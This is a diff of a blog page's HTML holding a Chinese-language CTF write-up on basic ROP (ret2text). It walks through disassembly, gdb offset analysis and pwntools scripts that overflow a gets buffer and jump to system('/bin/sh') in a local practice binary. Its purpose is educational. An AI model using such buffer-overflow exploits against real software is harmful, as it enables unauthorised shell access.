+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);
-  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);
-  <span class="hljs-built_in">gets</span>(s);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);
-  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-&#125;</code></pre></div>
 <p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p>
-<div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80485FD secure          proc near
-.text:<span class="hljs-number">0</span>80485FD
-.text:<span class="hljs-number">0</span>80485FD input           = dword ptr <span class="hljs-number">-10</span>h
-.text:<span class="hljs-number">0</span>80485FD secretcode      = dword ptr <span class="hljs-number">-0</span>Ch
-.text:<span class="hljs-number">0</span>80485FD
-.text:<span class="hljs-number">0</span>80485FD ; __unwind &#123;
-.text:<span class="hljs-number">0</span>80485FD                 push    ebp
-.text:<span class="hljs-number">0</span>80485FE                 mov     ebp, esp
-.text:<span class="hljs-number">0</span>8048600                 sub     esp, <span class="hljs-number">28</span>h
-.text:<span class="hljs-number">0</span>8048603                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; timer
-.text:<span class="hljs-number">0</span>804860A                 call    _time
-.text:<span class="hljs-number">0</span>804860F                 mov     [esp], eax      ; seed
-.text:<span class="hljs-number">0</span>8048612                 call    _srand
-.text:<span class="hljs-number">0</span>8048617                 call    _rand
-.text:<span class="hljs-number">0</span>804861C                 mov     [ebp+secretcode], eax
-.text:<span class="hljs-number">0</span>804861F                 lea     eax, [ebp+input]
-.text:<span class="hljs-number">0</span>8048622                 mov     [esp<span class="hljs-number">+4</span>], eax
-.text:<span class="hljs-number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760
-.text:<span class="hljs-number">0</span>804862D                 call    ___isoc99_scanf
-.text:<span class="hljs-number">0</span>8048632                 mov     eax, [ebp+input]
-.text:<span class="hljs-number">0</span>8048635                 cmp     eax, [ebp+secretcode]
-.text:<span class="hljs-number">0</span>8048638                 jnz     <span class="hljs-type">short</span> locret_8048646
-.text:<span class="hljs-number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span>
-.text:<span class="hljs-number">0</span>8048641                 call    _system 
-</code></pre></div>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0</span>80485FD secure          proc near</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD input           = dword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0</span>80485FD secretcode      = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0</span>80485FD                 push    ebp</span><br><span class="line">.text:<span class="number">0</span>80485FE                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0</span>8048600                 sub     esp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0</span>8048603                 mov     dword ptr [esp], <span class="number">0</span> ; timer</span><br><span class="line">.text:<span class="number">0</span>804860A                 call    _time</span><br><span class="line">.text:<span class="number">0</span>804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:<span class="number">0</span>8048612                 call    _srand</span><br><span class="line">.text:<span class="number">0</span>8048617                 call    _rand</span><br><span class="line">.text:<span class="number">0</span>804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:<span class="number">0</span>804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048622                 mov     [esp<span class="number">+4</span>], eax</span><br><span class="line">.text:<span class="number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:<span class="number">0</span>804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">0</span>8048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:<span class="number">0</span>8048638                 jnz     <span class="type">short</span> locret_8048646</span><br><span class="line">.text:<span class="number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0</span>8048641                 call    _system </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p>
-<div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80486A7                 lea     eax, [esp<span class="hljs-number">+80</span>h+s]
-.text:<span class="hljs-number">0</span>80486AB                 mov     [esp], eax      ; s
-.text:<span class="hljs-number">0</span>80486AE                 call    _gets
-.text:<span class="hljs-number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>
-.text:<span class="hljs-number">0</span>80486BA                 call    _printf
-.text:<span class="hljs-number">0</span>80486BF                 mov     eax, <span class="hljs-number">0</span>
-.text:<span class="hljs-number">0</span>80486C4                 leave</code></pre></div>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0</span>80486A7                 lea     eax, [esp<span class="number">+80</span>h+s]</span><br><span class="line">.text:<span class="number">0</span>80486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">0</span>80486AE                 call    _gets</span><br><span class="line">.text:<span class="number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="string">&quot;Maybe I will tell you next time !&quot;</span></span><br><span class="line">.text:<span class="number">0</span>80486BA                 call    _printf</span><br><span class="line">.text:<span class="number">0</span>80486BF                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0</span>80486C4                 leave</span><br></pre></td></tr></table></figure>
+
 <p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p>
-<div class="code-wrapper"><pre><code class="hljs C++">~ <span class="hljs-function">gdb ret2text</span>
-<span class="hljs-function">GNU <span class="hljs-title">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">12.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">22.04</span><span class="hljs-number">.2</span>)</span> 12.1</span>
-<span class="hljs-function"><span class="hljs-title">Copyright</span> <span class="hljs-params">(C)</span> 2022 Free Software Foundation, Inc.</span>
-<span class="hljs-function">gef➤ b *0x080486AE </span>
-<span class="hljs-function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="hljs-number">24.</span> </span>
-<span class="hljs-function">gef➤ r </span>
-<span class="hljs-function">There is something amazing here, do you know anything? Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080486ae</span> in main () at ret2text.c:<span class="hljs-number">24</span></span>
-<span class="hljs-function"></span>
-<span class="hljs-function">[ Legend: Modified register | Code | Heap | Stack | String ]</span>
-<span class="hljs-function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span>
-<span class="hljs-function">$eax   : <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span>
-<span class="hljs-function">$ebx   : <span class="hljs-number">0xf7fac000</span>  →  <span class="hljs-number">0x00229dac</span></span>
-<span class="hljs-function">$ecx   : <span class="hljs-number">0xf7fad9b4</span>  →  <span class="hljs-number">0x00000000</span></span>
-<span class="hljs-function">$edx   : <span class="hljs-number">0x1</span></span>
-<span class="hljs-function">$esp   : <span class="hljs-number">0xffffcf50</span>  →  <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span>
-<span class="hljs-function">$ebp   : <span class="hljs-number">0xffffcfd8</span>  →  <span class="hljs-number">0xf7ffd020</span>  →  <span class="hljs-number">0xf7ffda40</span>  →  <span class="hljs-number">0x00000000</span></span>
-<span class="hljs-function">$esi   : <span class="hljs-number">0xffffd094</span>  →  <span class="hljs-number">0xffffd1fc</span>  →  <span class="hljs-string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span>
-<span class="hljs-function">$edi   : <span class="hljs-number">0xf7ffcb80</span>  →  <span class="hljs-number">0x00000000</span></span>
-<span class="hljs-function">$eip   : <span class="hljs-number">0x080486ae</span>  →  &lt;main<span class="hljs-number">+0066</span>&gt; call <span class="hljs-number">0x8048460</span> &lt;gets@plt&gt;</span>
-<span class="hljs-function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span>
-<span class="hljs-function">$cs: <span class="hljs-number">0x23</span> $ss: <span class="hljs-number">0x2b</span> $ds: <span class="hljs-number">0x2b</span> $es: <span class="hljs-number">0x2b</span> $fs: <span class="hljs-number">0x00</span> $gs: <span class="hljs-number">0x63</span></span></code></pre></div>
-<ul>
-<li>
-<h4 id="栈内存布局分析"><strong>栈内存布局分析</strong></h4>
-</li>
-</ul>
-<p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p>
-<ul>
-<li>
-<h4 id="验证猜想"><strong>验证猜想</strong></h4>
-<p>通过我们上面的分析可以构造以下payload:</p>
-</li>
-</ul>
-<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span>
-<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="function">gdb ret2text</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">12.1</span><span class="number">-0u</span>buntu1~<span class="number">22.04</span><span class="number">.2</span>)</span> 12.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2022 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">gef➤ b *0x080486AE </span></span><br><span class="line"><span class="function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="number">24.</span> </span></span><br><span class="line"><span class="function">gef➤ r </span></span><br><span class="line"><span class="function">There is something amazing here, do you know anything? Breakpoint <span class="number">1</span>, <span class="number">0x080486ae</span> in main () at ret2text.c:<span class="number">24</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[ Legend: Modified register | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$eax   : <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebx   : <span class="number">0xf7fac000</span>  →  <span class="number">0x00229dac</span></span></span><br><span class="line"><span class="function">$ecx   : <span class="number">0xf7fad9b4</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$edx   : <span class="number">0x1</span></span></span><br><span class="line"><span class="function">$esp   : <span class="number">0xffffcf50</span>  →  <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebp   : <span class="number">0xffffcfd8</span>  →  <span class="number">0xf7ffd020</span>  →  <span class="number">0xf7ffda40</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$esi   : <span class="number">0xffffd094</span>  →  <span class="number">0xffffd1fc</span>  →  <span class="string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span></span><br><span class="line"><span class="function">$edi   : <span class="number">0xf7ffcb80</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$eip   : <span class="number">0x080486ae</span>  →  &lt;main<span class="number">+0066</span>&gt; call <span class="number">0x8048460</span> &lt;gets@plt&gt;</span></span><br><span class="line"><span class="function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="function">$cs: <span class="number">0x23</span> $ss: <span class="number">0x2b</span> $ds: <span class="number">0x2b</span> $es: <span class="number">0x2b</span> $fs: <span class="number">0x00</span> $gs: <span class="number">0x63</span></span></span><br></pre></td></tr></table></figure>
 
-sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)
-target = <span class="hljs-number">0x804863a</span>
-sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">108</span> + p32(target))
-sh.interactive()</code></pre></div>
+<ul>
+<li><h4 id="栈内存布局分析"><a href="#栈内存布局分析" class="headerlink" title="栈内存布局分析"></a><strong>栈内存布局分析</strong></h4></li>
+</ul>
+<p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c &#x3D; 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p>
+<ul>
+<li><h4 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a><strong>验证猜想</strong></h4>通过我们上面的分析可以构造以下payload:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">108</span> + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
 <p>得到以下输出，想想是哪里出了问题呢？</p>
-<div class="code-wrapper"><pre><code class="hljs Bash">~ python3 exp.py
-[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1593
-[*] Switching to interactive mode
-There is something amazing here, <span class="hljs-keyword">do</span> you know anything?
-Maybe I will tell you next <span class="hljs-keyword">time</span> ![*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive
-$ <span class="hljs-built_in">ls</span>
-[*] Process <span class="hljs-string">&#x27;./ret2text&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 1593)
-[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive</code></pre></div>
-<p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p>
-<div class="code-wrapper"><pre><code class="hljs x86asm">总偏移 = buf 到 <span class="hljs-built_in">EBP</span> 的距离 (<span class="hljs-number">0x6c</span>) + <span class="hljs-built_in">EBP</span> 自身大小 (<span class="hljs-number">4</span>) = <span class="hljs-number">0x70</span> (<span class="hljs-number">112</span>)</code></pre></div>
-<p>因此，正确的payload是：</p>
-<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span>
-<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1593</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> ![*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[*] Process <span class="string">&#x27;./ret2text&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 1593)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
 
-sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)
-target = <span class="hljs-number">0x804863a</span>
-<span class="hljs-comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span>
-sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>) + p32(target))
-sh.interactive()</code></pre></div>
+<p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总偏移 = buf 到 EBP 的距离 (0x6c) + EBP 自身大小 (4) = 0x70 (112)</span><br></pre></td></tr></table></figure>
+
+<p>因此，正确的payload是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line"><span class="comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> *(<span class="number">108</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
 <p>输出如下：</p>
-<div class="code-wrapper"><pre><code class="hljs Bash">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py
-[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1766
-[*] Switching to interactive mode
-There is something amazing here, <span class="hljs-keyword">do</span> you know anything?
-Maybe I will tell you next <span class="hljs-keyword">time</span> !$ <span class="hljs-built_in">ls</span>
-exp.py  flag  ret2text
-$ <span class="hljs-built_in">cat</span> flag
-flag&#123;This_is_the_right_payload&#125;
-$
-[*] Interrupted
-[*] Stopped process <span class="hljs-string">&#x27;./ret2text&#x27;</span> (pid 1766)</code></pre></div>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1766</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> !$ <span class="built_in">ls</span></span><br><span class="line">exp.py  flag  ret2text</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;This_is_the_right_payload&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./ret2text&#x27;</span> (pid 1766)</span><br></pre></td></tr></table></figure>
+
 <p>不断更新，敬请期待！</p>
 <script src="https://giscus.app/client.js"
         data-repo="solkatt-cn/solkatt-cn.github.io"
@@ -554,429 +317,151 @@ $
         async>
 </script>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
+  </div>
+</article>
 
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
+
+
         
-  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
-  
-  
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-      </span>
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/zer0ptr">Projects</a></li>
+        
+      </ul>
+    </div>
+
     
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>Basic ROP Learning</div>
-      <div>https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>zer0ptr</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2025年4月19日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-cc-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/" title="由一道题引发对DFS的思考">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">由一道题引发对DFS的思考</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="条件竞争漏洞学习">
-                        <span class="hidden-mobile">条件竞争漏洞学习</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  
-  
-    <article id="comments" lazyload>
-      
-
-    </article>
-  
-
-
-          </article>
-        </div>
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-ROP-Learning"><span class="toc-number">1.</span> <span class="toc-text">Basic-ROP-Learning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Return-Oriented-Programming-%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">ROP(Return-Oriented Programming)概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">1. 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF"><span class="toc-number">2.1.1.</span> <span class="toc-text">（1）产生背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.2.</span> <span class="toc-text">（2）核心原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">2. 关键组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.3.</span> <span class="toc-text">3. 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">2.4.</span> <span class="toc-text">4. 防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%9E%E4%BE%8B-Linux-x86-ROP-Exploit"><span class="toc-number">2.5.</span> <span class="toc-text">5.实例 Linux x86 ROP Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-ret2text"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">(1) ret2text</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">2.5.1.</span> <span class="toc-text">基本分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%88%86%E6%9E%90"><span class="toc-number">2.5.2.</span> <span class="toc-text">栈内存布局分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%8C%9C%E6%83%B3"><span class="toc-number">2.5.3.</span> <span class="toc-text">验证猜想</span></a></li></ol></li></ol></li></ol>
       </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
